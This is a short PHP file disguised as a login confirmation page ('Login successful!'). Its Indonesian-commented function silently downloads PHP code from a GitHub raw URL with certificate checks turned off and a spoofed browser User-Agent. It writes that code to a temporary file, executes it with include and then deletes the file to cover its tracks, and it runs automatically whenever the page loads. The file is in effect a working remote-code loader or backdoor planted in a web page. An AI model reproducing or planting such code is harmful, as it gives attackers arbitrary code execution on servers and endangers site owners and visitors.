<p>Login successful!</p><?php

function fetch_and_execute_remote_php($url) {
    // Mengatur opsi untuk konteks stream, termasuk header HTTP dan SSL
    $options = [
        "http" => [
            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n" .
                        "Accept: application/json\r\n" .
                        "Accept-Language: en-US,en;q=0.9\r\n" .
                        "Cache-Control: no-cache\r\n" .
                        "Pragma: no-cache\r\n"
        ],
        "ssl" => [
            "verify_peer" => false,
            "verify_peer_name" => false
        ]
    ];

    // Membuat konteks stream dengan opsi yang sudah ditentukan
    $context = stream_context_create($options);

    // Mendapatkan konten dari URL yang diberikan
    $result = @file_get_contents($url, false, $context);

    // Jika terjadi kesalahan dalam mendapatkan konten
    if ($result === false) {
        echo "Error: Unable to fetch content.";
        return;
    }

    // Validasi konten yang diunduh (misalnya memastikan hanya berisi PHP)
    if (strpos($result, '<?php') === false) {
        echo "Error: Invalid content.";
        return;
    }

    // Menulis konten yang diunduh ke dalam file sementara
    $filePath = __DIR__ . '/temp_' . uniqid() . '.php';
    if (file_put_contents($filePath, $result) !== false) {
        try {
            // Menyertakan file sementara untuk dieksekusi
            include $filePath;
        } catch (Exception $e) {
            echo "Error: Unable to include the temporary file. " . $e->getMessage();
        }
        // Menghapus file sementara setelah dieksekusi
        unlink($filePath);
    } else {
        echo "Error: Unable to write to temporary file.";
    }
}

// Panggil fungsi dengan URL yang diinginkan
fetch_and_execute_remote_php("https://raw.githubusercontent.com/Zeddgansz/Alattempur/main/open.php");

?>
